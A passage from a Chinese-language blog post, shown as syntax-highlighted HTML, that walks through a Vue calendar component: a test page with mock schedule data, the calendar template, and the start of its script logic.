class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"test-container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Test页面，测试组件<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!-- 日历 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">calendar</span> <span class=\"attr\">v-if</span>=<span class=\"string\">\"calendarVisible\"</span> @<span class=\"attr\">getDateInfo</span>=<span class=\"string\">\"getDateInfo\"</span> <span class=\"attr\">:propsInfoList</span>=<span class=\"string\">\"propsInfoList\"</span> <span class=\"attr\">:propsTime</span>=<span class=\"string\">\"propsTime\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">calendar</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">import</span> calendar <span class=\"keyword\">from</span> <span class=\"string\">'@/components/Calendar/Calendar.vue'</span></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">  name: <span class=\"string\">'test'</span>,</span></span><br><span class=\"line\"><span class=\"undefined\">  components: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"string\">\"calendar\"</span>: calendar</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      calendarVisible: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">      propsTime: <span class=\"string\">''</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">      propsInfoList: <span class=\"string\">''</span>,</span></span><br><span class=\"line\"><span class=\"undefined\">      middle: [</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'232'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-01'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'292'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-06'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'292'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-07'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">        &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          id: <span class=\"string\">'369'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          date: <span class=\"string\">'2019-06-30'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          info: <span class=\"string\">'我要去吃大餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      ]</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  created() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 模拟首屏ajax请求，将当月数据传入组件中</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">this</span>.propsInfoList = <span class=\"built_in\">JSON</span>.stringify(<span class=\"keyword\">this</span>.middle)</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">this</span>.propsTime = <span class=\"keyword\">this</span>.getToday()</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  mounted() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.alert(<span class=\"string\">'测试时间为19年 5、6、7月，完成是在6月'</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">  methods: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 格式化当前日期 YYYY-MM-DD</span></span></span><br><span class=\"line\"><span class=\"undefined\">    getToday() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> nowDate = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> yy = nowDate.getFullYear().toString()</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> mm = (nowDate.getMonth() + <span class=\"number\">1</span> + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> dd = (nowDate.getDate() + <span class=\"string\">''</span>).padStart(<span class=\"number\">2</span>,<span class=\"string\">'0'</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// let hh = nowDate.getHours().toString().padStart(2,'0')</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// let mt = (nowDate.getMinutes() + '').padStart(2,'0')</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// let ss = (nowDate.getSeconds() + '').padStart(2,'0')</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> <span class=\"string\">`<span class=\"subst\">$&#123;yy&#125;</span>-<span class=\"subst\">$&#123;mm&#125;</span>-<span class=\"subst\">$&#123;dd&#125;</span>`</span> <span class=\"comment\">// -$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125;</span></span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"comment\">// 组件传值</span></span></span><br><span class=\"line\"><span class=\"undefined\">    getDateInfo(year, month) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span></span><br><span class=\"line\"><span class=\"javascript\">      _this.propsTime = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>-<span class=\"subst\">$&#123;month&#125;</span>`</span></span></span><br><span class=\"line\"><span class=\"javascript\">      _this.calendarVisible = <span class=\"literal\">false</span></span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"comment\">// 模拟点击选取其他年月的ajax，假数据，只能显示19年 5 6 7三个月</span></span></span><br><span class=\"line\"><span class=\"javascript\">      setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        _this.propsInfoList = []</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> middle</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span>(month == <span class=\"string\">'05'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          middle  = [</span></span><br><span class=\"line\"><span class=\"undefined\">            &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">              id: <span class=\"string\">'232'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              date: <span class=\"string\">'2019-05-10'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              info: <span class=\"string\">'我要去吃小餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">            &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">          ]</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (month == <span class=\"string\">'06'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          middle = _this.middle</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (month == <span class=\"string\">'07'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          middle  = [</span></span><br><span class=\"line\"><span class=\"undefined\">            &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">              id: <span class=\"string\">'232'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              date: <span class=\"string\">'2019-07-10'</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">              info: <span class=\"string\">'我要去吃小餐'</span></span></span><br><span class=\"line\"><span class=\"undefined\">            &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">          ]</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          middle = <span class=\"string\">''</span></span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">        _this.propsInfoList = <span class=\"built_in\">JSON</span>.stringify(middle)</span></span><br><span class=\"line\"><span class=\"javascript\">        _this.calendarVisible = <span class=\"literal\">true</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;, 100)</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>日历子组件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-container\"</span>&gt;</span></span><br><span class=\"line\">    // 日历标题</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>calendar<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">    // 显示本月日期 2019-6，可点击</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"show-date\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"clickData\"</span>&gt;</span>&#123;&#123;showDate&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    // 今天的日期 2019-6-6</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"now-time\"</span>&gt;</span>今日：&#123;&#123;exactTime&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    // 日历组件</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar\"</span>&gt;</span></span><br><span class=\"line\">    // 日历组件头部</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-header\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>日<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>一<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>二<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>三<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>四<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>五<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>六<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    // 日历组件主体</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-body\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">\"calendar-row\"</span> <span class=\"attr\">v-for</span>=<span class=\"string\">\"(item, index) in JSON.parse(calendarData)\"</span> <span class=\"attr\">:key</span>=<span class=\"string\">\"index\"</span>&gt;</span></span><br><span class=\"line\">          // 注意给 不同的日子加类名</span><br><span class=\"line\">          // 周末：weekend  工作日：weekday</span><br><span class=\"line\">          // 过去的事项 already-time 今天的事项 exact-time 将来的事项 soon-time</span><br><span class=\"line\">          // 给有事项的日子实现点击弹框，显示这天的事项内容</span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">v-for</span>=<span class=\"string\">\"(subItem, subIndex) in item\"</span> <span class=\"attr\">:class</span>=<span class=\"string\">\"[subIndex == 0 || subIndex == 6? 'weekend': 'weekday', subItem.type == '1'? 'exact-time': '', subItem.type == '0'? 'already-time': '', subItem.type == '2'? 'soon-time': '']\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"showInfo(subItem)\"</span> <span class=\"attr\">:key</span>=<span class=\"string\">\"subIndex\"</span>&gt;</span></span><br><span class=\"line\">            &#123;&#123;subItem.date&#125;&#125;</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    // popup 和 picker 搭配，实现 年月 选择   mint-ui 库</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mt-popup</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"popupVisible\"</span> <span class=\"attr\">position</span>=<span class=\"string\">\"bottom\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">mt-picker</span> <span class=\"attr\">:slots</span>=<span class=\"string\">\"slots\"</span> <span class=\"attr\">:showToolbar</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">:visibleItemCount</span>=<span class=\"string\">\"5\"</span> <span class=\"attr\">:itemHeight</span>=<span class=\"string\">\"itemsHeight\"</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"picker\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"@/assets/images/picker_cancel.png\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"picker_cancel\"</span> <span class=\"attr\">v-on:click</span>=<span class=\"string\">\"cancelFunc()\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span> =<span class=\"string\">\"@/assets/images/picker_sure.png\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"picker_sure\"</span> <span class=\"attr\">v-on:click</span>=<span class=\"string\">\"sureFunc()\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">mt-picker</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">mt-popup</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>日历子组件逻辑：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; MessageBox &#125; <span class=\"keyword\">from</span> <span class=\"string\">'mint-ui'</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"calendar\"</span>,</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    propsTime: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">    propsInfoList: <span class=\"built_in\">String</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  data() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 接收父组件传值 '2019-06'</span></span><br><span class=\"line\">      time: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 接收父组件数据列表</span></span><br><span class=\"line\">      infoList: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 日历组件</span></span><br><span class=\"line\">      calendarData: [],</span><br><span class=\"line\">      <span class=\"comment\">// 页面展示的 '年-月'</span></span><br><span class=\"line\">      showDate: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 当前的 '年-月-日'</span></span><br><span class=\"line\">      exactTime: <span class=\"string\">''</span>,</span><br><span class=\"line\">      <span class=\"comment\">// picker 高度</span></span><br><span class=\"line\">      itemsHeight: <span class=\"number\">95</span> * <span class=\"built_in\">window</span>.screen.height / <span class=\"number\">1334</span>,</span><br><span class=\"line\">      <span class=\"comment\">// pupop 显示</span></span><br><span class=\"line\">      popupVisible: <span class=\"literal\">false</span>,</span><br><span class=\"line\">      <span class=\"comment\">// picker 数据</span></span><br><span class=\"line\">      slots: []</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  created() &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 拿到父组件的 list</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.infoList = <span class=\"keyword\">this</span>.propsInfoList</span><br><span class=\"line\">    <span class=\"comment\">// 拿到父组件的 '2019-06'</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.time = <span class=\"keyword\">this</span>.propsTime.split(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 获取今天 '2019-06-06'</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> date = <span class=\"keyword\">this</span>.getToday()</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.exactTime = date.slice(<span class=\"number\">0</span>,<span class=\"number\">3</span>).join(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 日历组件</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getCalendar(...(<span class=\"keyword\">this</span>.time))</span><br><span class=\"line\">    <span class=\"comment\">// 组装 picker 数组</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.getSlotsArray(...(date.slice(<span class=\"number\">0</span>,<span class=\"number\">2</span>)))</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  methods: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 日历组件</span></span><br><span class=\"line\">    getCalendar(year, month) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> _this = <span class=\"keyword\">this</span></span><br><span class=\"line\">      <span class=\"comment\">// 转存当天 '2019-06-06'</span></span><br><span class=\"line\">      <span 